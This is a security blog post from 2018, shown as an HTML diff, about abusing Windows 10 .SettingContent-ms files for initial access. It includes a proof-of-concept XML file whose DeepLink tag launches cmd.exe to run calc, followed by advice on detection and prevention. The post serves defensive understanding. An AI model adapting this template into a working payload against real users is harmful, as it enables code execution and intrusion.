@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        Understandings on .SettingContent-ms as aื Initial Access Vector ::
+        Pandora&#39;s Box
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="Technical Specification  .SettingContent-ms is a format of file that allow a user to create &amp;ldquo;shortcuts&amp;rdquo; to options available on Windows 10 setting pages .SettingContent-ms was introduced in Windows 10 and can be constructed in XML syntax The target application to be launched with .SettingContent-ms can be specified on &amp;lt;DeepLink&amp;gt; tag. The modified .SettingContent-ms will execute program directly without intermediate program. Poisoned .SettingContent-ms files can be delivered via HTTP/S, execution without notification and warning to users."
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://pandora.sh/posts/settingscontent-ms-as-a-inital-access-vector/" />
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css" integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js" integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js" integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
+    onload="renderMathInElement(document.body);"></script>
+
+
+<link rel="stylesheet" href="https://pandora.sh/assets/style.css" />
+
+<link rel="stylesheet" href="https://pandora.sh/style.css" />
+
+
+<link
+  rel="apple-touch-icon-precomposed"
+  sizes="144x144"
+  href="https://pandora.sh/img/apple-touch-icon-144-precomposed.png"
+/>
+<link rel="shortcut icon" href="https://pandora.sh/img/favicon.png" />
+
+
+<link href="https://pandora.sh/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://pandora.sh/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://pandora.sh/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://pandora.sh/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://pandora.sh/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://pandora.sh/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Understandings on .SettingContent-ms as aื Initial Access Vector"/>
+<meta name="twitter:description" content=".SettingContent-ms is a format of file that allow a user to create &#34;shortcuts&#34; to options available on Windows 10 setting pages"/>
+
+
+
+<meta property="og:title" content="Understandings on .SettingContent-ms as aื Initial Access Vector" />
+<meta property="og:description" content=".SettingContent-ms is a format of file that allow a user to create &#34;shortcuts&#34; to options available on Windows 10 setting pages" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://pandora.sh/posts/settingscontent-ms-as-a-inital-access-vector/" />
+<meta property="article:published_time" content="2018-12-29T13:27:00+07:00" />
+<meta property="article:modified_time" content="2018-12-29T13:27:00+07:00" /><meta property="og:site_name" content="Pandora&#39;s Box" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >Pandora&#39;s Box</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/archive">Archive</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/archive">Archive</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">Understandings on .SettingContent-ms as aื Initial Access Vector</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2018-12-29
+        </span>
+
+        
+          
+        
+      
+
+      
+        <span class="post-author"
+          >— Written by P. Boonyakarn</span
+        >
+
+
+      
+    </div>
+
+    
+
+    
+
+    <div class="post-content">
+      
+      <h2 id="technical-specification">Technical Specification</h2>
+<ul>
+<li><code>.SettingContent-ms</code> is a format of file that allow a user to create &ldquo;shortcuts&rdquo; to options available on Windows 10 setting pages</li>
+<li><code>.SettingContent-ms</code> was introduced in Windows 10 and can be constructed in XML syntax</li>
+<li>The target application to be launched with <code>.SettingContent-ms</code> can be specified on <code>&lt;DeepLink&gt;</code> tag. The modified <code>.SettingContent-ms</code> will execute program directly without intermediate program.</li>
+<li>Poisoned <code>.SettingContent-ms</code> files can be delivered via HTTP/S, execution without notification and warning to users.</li>
+<li>Max character size allowed on <code>&lt;DeepLink&gt;</code> tag is 517 characeters.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!-- From https://gist.github.com/enigma0x3/b948b81717fd6b72e0a4baca033e07f8 --&gt;</span>
+<span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span style="color:#f92672">&lt;PCSettings&gt;</span>
+  <span style="color:#f92672">&lt;SearchableContent</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://schemas.microsoft.com/Search/2013/SettingContent&#34;</span><span style="color:#f92672">&gt;</span>
+    <span style="color:#f92672">&lt;ApplicationInformation&gt;</span>
+      <span style="color:#f92672">&lt;AppID&gt;</span>windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel<span style="color:#f92672">&lt;/AppID&gt;</span>
+      <span style="color:#f92672">&lt;DeepLink&gt;</span>%windir%\system32\cmd.exe /c calc.exe<span style="color:#f92672">&lt;/DeepLink&gt;</span>
+      <span style="color:#f92672">&lt;Icon&gt;</span>%windir%\system32\control.exe<span style="color:#f92672">&lt;/Icon&gt;</span>
+    <span style="color:#f92672">&lt;/ApplicationInformation&gt;</span>
+    <span style="color:#f92672">&lt;SettingIdentity&gt;</span>
+      <span style="color:#f92672">&lt;PageID&gt;&lt;/PageID&gt;</span>
+      <span style="color:#f92672">&lt;HostID&gt;</span>host_id<span style="color:#f92672">&lt;/HostID&gt;</span>
+    <span style="color:#f92672">&lt;/SettingIdentity&gt;</span>
+    <span style="color:#f92672">&lt;SettingInformation&gt;</span>
+      <span style="color:#f92672">&lt;Description&gt;</span>@shell32.dll,-4161<span style="color:#f92672">&lt;/Description&gt;</span>
+      <span style="color:#f92672">&lt;Keywords&gt;</span>@shell32.dll,-4161<span style="color:#f92672">&lt;/Keywords&gt;</span>
+    <span style="color:#f92672">&lt;/SettingInformation&gt;</span>
+  <span style="color:#f92672">&lt;/SearchableContent&gt;</span>
+<span style="color:#f92672">&lt;/PCSettings&gt;</span>
+</code></pre></div><h2 id="detectionprevention">Detection/Prevention</h2>
+<ul>
+<li>Monitor an execution of child processes from Office applications</li>
+<li>Look for existing of <code>.SettingContent-ms outside </code>C:\Windows\ImmersiveControlPanel`</li>
+<li>Examine command logging is enabled</li>
+<li>Blocking <code>.SettingContent-ms</code> on the perimeter</li>
+<li>Changing the file association types for <code>.SettingContent-ms</code> to notepad or something different that does not execute the code</li>
+</ul>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39">The Tale of SettingContent-ms Files</a></li>
+<li><a href="https://www.trustedsec.com/2018/06/weaponizing-settingcontent/">Weaponizing .SettingContent-ms Extensions for Code Execution</a></li>
+</ul>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h"
+              >Read other posts</span
+            >
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://pandora.sh/posts/epp-and-edr-bypass-techniques/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Endpoint Protection, Detection and Response Bypass Techniques Index</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://pandora.sh/posts/msfrpc-forked/">
+                  <span class="button__text">My Forked Version of msfrpc with Python3 Support</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >Pandora&#39;s Box</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+          <span>
+              <a href="https://webring.wonderful.software#pandora.sh" title="วงแหวนเว็บ" target="_blank" rel="noopener">
+                <img src="/img/webring.svg" width="20px" height="20px" alt="วงแหวนเว็บ" />
+              </a>
+          </span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://pandora.sh/assets/main.js"></script>
+<script src="https://pandora.sh/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
